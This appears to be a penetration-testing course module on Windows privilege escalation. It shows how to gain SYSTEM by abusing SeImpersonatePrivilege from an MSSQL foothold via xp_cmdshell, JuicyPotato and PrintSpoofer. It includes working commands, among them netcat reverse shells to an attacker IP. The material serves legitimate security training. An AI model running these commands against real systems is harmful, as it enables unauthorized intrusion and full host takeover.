In Windows, every process has a token that has information about the account that is running it. These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the `SeImpersonate` privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening. An example of using this token would be [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

- Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. 
	- Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. 
- Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. 
	- Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.

We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges. This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) is worth reading for further details on token impersonation attacks.


## SeImpersonate Example - JuicyPotato

Let's take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) privilege.

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.


#### Connecting with MSSQLClient.py

Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.
```shell-session
wallywhatever@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

[!] Press help for extra shell commands
SQL>
```

#### Enabling xp_cmdshell

Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing `enable_xp_cmdshell`. Typing `help` displays a few other command options.
```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

>Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

#### Confirming Access

With this access, we can confirm that we are indeed running in the context of a SQL Server service account.
```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

#### Checking Account Privileges

Next, let's check what privileges the service account has been granted.
```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   

PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.

#### JuicyPotato Arguments
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)

-z only test CLSID and print token's user
```


#### Escalating Privileges Using JuicyPotato

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------

```

This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.

## PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

#### PrintSpoofer Arguments
```
C:\TOOLS>PrintSpoofer.exe -h

PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```

#### Escalating Privileges using PrintSpoofer

Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).
```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL 
```
If all goes according to plan, we will have a SYSTEM shell on our netcat listener.
